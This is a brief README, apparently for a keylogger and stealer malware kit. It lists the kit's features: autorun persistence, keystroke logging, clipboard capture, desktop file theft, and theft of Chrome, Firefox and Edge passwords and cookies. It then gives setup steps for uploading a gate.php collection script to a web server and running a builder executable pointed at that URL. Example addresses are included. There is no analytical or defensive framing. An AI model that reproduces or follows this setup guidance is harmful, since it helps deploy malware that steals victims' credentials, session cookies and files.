Keylogger - stealer

Autorun

Keylogging

Clipboard

Desktop Files

Chrome , Firefox, Egde Passwords and Cookies

Upload the gate.php file to the web server and set the file permissions

Run builder.exe enter url

For example: subdomain.freehost.edu/gate.php or mydomain.edu/gate.pgp

127.0.0.1/gate.php
